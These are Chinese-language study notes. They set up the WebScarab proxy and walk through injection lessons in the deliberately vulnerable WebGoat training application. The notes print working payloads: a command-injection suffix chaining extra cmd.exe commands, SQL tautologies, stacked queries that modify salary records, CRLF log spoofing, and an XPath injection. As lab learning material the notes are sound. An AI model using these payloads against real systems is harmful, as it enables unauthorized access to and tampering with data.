# Webscrab

在Tools中选择Reveal Hidden FIelds和Use full-featured interface，**重启后才能生效**。

默认监听的端口号为8008.可以**在Proxy中进行修改**，不过首先需要选中，点击旁边的stop停止监听。修改为9999，修改后**可以在Messages一栏中查看运行日志**。不过需要对应在**控制面板(-网络和internet-网络和共享中心)-internet选项-连接-局域网设置-代理服务器**中设置系统代理，即为LAN使用代理服务器修改端口号为9999。**注意需要取消对于本地地址不使用代理服务器的√**。

修改完成后，就能发现原来是Listener.run，现在变成了Listener.listen

~~~
参考下面的进行了配置
https://www.jianshu.com/p/0097d27a269e
webscrab
https://blog.csdn.net/ssdsafsdsd/article/details/40594261
https://cloud.tencent.com/developer/article/1123547
~~~

在浏览器的URL一栏中输入地址，就会跳出Edit Response界面，在这个界面中，可以进行修改。做出修改后，**单击Accept changes就可以将修改后的内容发送到服务器上**。如果Cancel changes，就会发送原始的请求。如果根本不想给服务器发送一个请求，可以选择Abort request，向浏览器返回一个错误。如果打开了多个拦截窗口，可以使用Cancel ALL intercepts释放所有的请求。**如果在Proxy-Manual Edit中取消勾选Intercept request就不会进行拦截了**。在Manual Edit中有Exclude paths matching，后面跟的是正则表达式，用于匹配请求的URL，如果匹配，请求就不会被拦截。

可以试试使用**IE浏览器**打开Webgoat界面。



# Injection

命令注入攻击对于任何参数驱动的网站都是一个威胁。

## Command Injection

截取后在末尾添加

~~~
" & netstat -an & config
~~~

因为原来是执行

~~~
页面提示的是
ExecResults for 'cmd.exe /c type "E:\safe\WebGoat-5.4\tomcat\webapps\WebGoat\lesson_plans\English\AccessControlMatrix.html"'
执行的内容是单引号的部分，即
cmd.exe /c type "E:\safe\WebGoat-5.4\tomcat\webapps\WebGoat\lesson_plans\English\AccessControlMatrix.html"

添加后就执行
cmd.exe /c type "E:\safe\WebGoat-5.4\tomcat\webapps\WebGoat\lesson_plans\English\AccessControlMatrix.html" & netstat -an & ipconfig
~~~

## Numeric SQL Injection

在SQL语句中增加 or 1=1，就能过跳过筛选，获取全部的内容。



## Log Spoofing

在输入的用户名称中smith修改为

~~~
smith%0d%0alogin succeeded for the username: smith
会显示login succeeded for the username: smith
~~~



## XPATH Injection

XPath Injection类似SQL注入。

~~~xquery
XPath query

String dir = s.getContext().getRealPath("/lessons/XPATHInjection/EmployeesData.xml");
File d = new File(dir);
XPathFactory factory = XPathFactory.newInstance();
XPath xPath = factory.newXPath();
InputSource inputSource = new InputSource(new FileInputStream(d));
String expression = "/employees/employee[loginID/text()='" + username + "' and passwd/text()='" + password + "']";
nodes = (NodeList) xPath.evaluate(expression, inputSource, XPathConstants.NODESET);
~~~

但是是需要用到字符串的引号.

~~~xquery
Mike' or 1=1 or 'a'='a

服务器的解释方法是
expression = "/employees/employee[ ( loginID/text()='Smith' or 1=1 ) OR ( 'a'='a' and passwd/text()='password' ) ]"
~~~



## string SQL Injection

输入字符的SQL注入，因为是获取字符，所以可以在之前数字的前提下增加引号。

~~~sql
//输入为Erwon的情况
SELECT * FROM user_data WHERE last_name = 'Erwon' 

//输入为Erwon，拦截后增加' or '1'='1
SELECT * FROM user_data WHERE last_name = 'Erwon' or '1'='1'

~~~



## LAB: SQL Injcetion

~~~sql
"SELECT * FROM employee WHERE userid = " + userId + " and password = " + password
~~~

但是这里有长度限制，需要使用webscarab进行移除。

~~~sql
"SELECT * FROM employee WHERE userid = " + userId + " and password = " + password
~~~



## Modify Data with SQL Injection

可以使用SQL注入修改数据。只需要使用;(semicolon)

~~~sql
jsmith';UPDATE salaries SET salary=99999 WHERE userid='jsmith'--这是评论
~~~



## ADD Data with SQL Injection

使用INSERT语句。

~~~sql
bar';INSERT INTO salaries VALUES('goa',99999);--插入用户名为goa，薪资为99999的一条记录
~~~



## Database Backdoors

使用SQL注入实现大于一条的SQL语句。



# XSS

